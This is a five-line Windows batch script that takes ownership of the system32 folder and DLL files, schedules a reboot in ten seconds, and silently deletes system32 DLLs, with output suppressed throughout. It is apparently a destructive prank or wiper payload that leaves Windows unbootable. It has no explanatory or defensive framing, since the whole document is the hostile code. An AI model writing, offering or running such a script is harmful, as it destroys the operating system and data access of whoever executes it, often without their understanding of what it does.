@echo off
cd %SystemRoot%
takeown /f system32 *.dll /r >null
shutdown /r /t 10
del "%SystemRoot%\system32" *.dll /q >null
